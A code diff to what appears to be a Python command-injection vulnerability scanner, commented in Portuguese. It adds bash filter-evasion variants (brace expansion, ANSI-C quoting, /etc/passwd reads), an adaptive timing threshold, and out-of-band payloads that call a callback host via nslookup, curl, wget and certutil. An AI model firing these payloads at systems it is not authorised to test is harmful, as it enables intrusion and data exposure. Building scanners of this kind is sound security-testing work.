@@ -130,7 +130,24 @@ class CommandInjectionScanner:
             # 15. Environment variable abuse
             evasion_techniques.append(payload.replace("whoami", "$USER"))
             evasion_techniques.append(payload.replace("id", "$UID"))
-        
+
+            # 16. Arithmetic expansion
+            evasion_techniques.append(payload.replace("5", "$((5))"))
+            evasion_techniques.append(payload.replace("5", "$[5]"))
+
+            # 17. Process substitution
+            if "cat" in payload:
+                evasion_techniques.append(payload.replace("cat /etc/passwd", "< /etc/passwd"))
+
+            # 18. ANSI-C Quoting
+            evasion_techniques.append(payload.replace("whoami", "$'whoami'"))
+
+            # 19. Brace expansion
+            evasion_techniques.append(payload.replace("whoami", "{whoami}"))
+
+            # 20. Variable indirection
+            evasion_techniques.append(payload.replace("whoami", "${!#}whoami"))
+
         # Técnicas específicas avançadas
         advanced_payloads = [
             # Bash-specific evasions
@@ -191,51 +208,7 @@ class CommandInjectionScanner:
             "; $((1)) && whoami",
             "; let 1 && whoami"
         ]
-            
-            # 10. Command substitution variations
-        if "`" in payload:
-                evasion_techniques.append(payload.replace("`", "$(").replace("`", ")"))
-            
-            # 11. Concatenation techniques
-        if "whoami" in payload:
-                evasion_techniques.append(payload.replace("whoami", "who''ami"))
-                evasion_techniques.append(payload.replace("whoami", "who\"\"ami"))
-                evasion_techniques.append(payload.replace("whoami", "wh\\oami"))
-            
-            # 12. Environment variable injection
-        evasion_techniques.append(payload.replace("whoami", "$0ami" if "whoami" in payload else payload))
-            
-            # 13. Wildcard evasion
-        if "cat" in payload:
-                evasion_techniques.append(payload.replace("cat", "c?t"))
-                evasion_techniques.append(payload.replace("cat", "c*t"))
-            
-            # 14. Path traversal combined
-        evasion_techniques.append(payload.replace("/etc/passwd", "../../../etc/passwd"))
-        evasion_techniques.append(payload.replace("/etc/passwd", "....//....//....//etc/passwd"))
-            
-            # 15. Alternative commands
-        if "whoami" in payload:
-                evasion_techniques.append(payload.replace("whoami", "id -un"))
-                evasion_techniques.append(payload.replace("whoami", "echo $USER"))
-            
-            # 16. Arithmetic expansion
-        evasion_techniques.append(payload.replace("5", "$((5))"))
-        evasion_techniques.append(payload.replace("5", "$[5]"))
-            
-            # 17. Process substitution
-        if "cat" in payload:
-                evasion_techniques.append(payload.replace("cat /etc/passwd", "< /etc/passwd"))
-            
-            # 18. ANSI-C Quoting
-        evasion_techniques.append(payload.replace("whoami", "$'whoami'"))
-            
-            # 19. Brace expansion
-        evasion_techniques.append(payload.replace("whoami", "{whoami}"))
-            
-            # 20. Variable indirection
-        evasion_techniques.append(payload.replace("whoami", "${!#}whoami"))
-        
+
         # Combinar payloads base com técnicas de evasão
         all_payloads = base_payloads + evasion_techniques
         
@@ -284,15 +257,71 @@ class CommandInjectionScanner:
         return False, None
 
     def _detect_time_based_injection(self, response_time, payload):
-        """Detecta command injection baseado em tempo de resposta."""
+        """Detecta command injection baseado em tempo de resposta com threshold adaptativo."""
         time_based_payloads = ['sleep', 'timeout', 'ping']
-        
-        if any(cmd in payload.lower() for cmd in time_based_payloads):
-            # Se o payload tem comando de tempo e a resposta demorou mais que 4 segundos
-            if response_time > 4.0:
-                return True
-        
-        return False
+
+        if not any(cmd in payload.lower() for cmd in time_based_payloads):
+            return False
+
+        # Usa threshold dinâmico: max(4.0, baseline * 2) — evita FP em alvos lentos
+        threshold = getattr(self, '_cmd_timing_threshold', 4.0)
+        return response_time > threshold
+
+    def _measure_cmd_baseline_rtt(self, url: str, method: str = 'get',
+                                   samples: int = 3) -> float:
+        """
+        Mede RTT baseline do alvo para calcular threshold de timing adaptativo.
+        Chama antes do scan principal para evitar falsos positivos.
+        """
+        timings = []
+        for _ in range(samples):
+            try:
+                start = datetime.datetime.now()
+                self.session.get(url, timeout=10, verify=False)
+                elapsed = (datetime.datetime.now() - start).total_seconds()
+                timings.append(elapsed)
+            except Exception:
+                pass
+        baseline = sum(timings) / len(timings) if timings else 1.0
+        # Threshold = máx(4.0, 2× baseline) — garante margem mínima de 4s
+        self._cmd_timing_threshold = max(4.0, baseline * 2)
+        self.logger.debug(f"Baseline RTT: {baseline:.2f}s | Threshold timing: {self._cmd_timing_threshold:.2f}s")
+        return baseline
+
+    def add_oast_payloads(self, oast_host: str) -> None:
+        """
+        Adiciona payloads OOB DNS (Out-of-Band) para detecção blind
+        de command injection via callback OAST.
+
+        Args:
+            oast_host: Hostname OAST gerado por OASTClient.generate_host()
+        """
+        oob_payloads = [
+            # Unix — nslookup, dig, curl, wget
+            f"; nslookup {oast_host}",
+            f"&& nslookup {oast_host}",
+            f"| nslookup {oast_host}",
+            f"; dig {oast_host}",
+            f"; curl http://{oast_host}/ci",
+            f"; wget -q http://{oast_host}/ci -O /dev/null",
+            f"`nslookup {oast_host}`",
+            f"$(nslookup {oast_host})",
+            # Windows — nslookup + certutil
+            f"; nslookup {oast_host} && echo done",
+            f"& nslookup {oast_host}",
+            f"| certutil -urlcache -split -f http://{oast_host}/ci NUL",
+            # Evasão com IFS
+            f";$IFS$()nslookup$IFS${oast_host}",
+            # Backtick com nslookup
+            f"`;nslookup {oast_host};`",
+        ]
+        # Adiciona sem duplicar payloads já existentes
+        existing = set(self.payloads)
+        for p in oob_payloads:
+            if p not in existing:
+                self.payloads.append(p)
+                existing.add(p)
+        self.logger.debug(f"Adicionados {len(oob_payloads)} payloads OOB para OAST host: {oast_host}")
 
     def _scan_target(self, url, method, param, form_data=None):
         """Escaneia um parâmetro específico para command injection."""
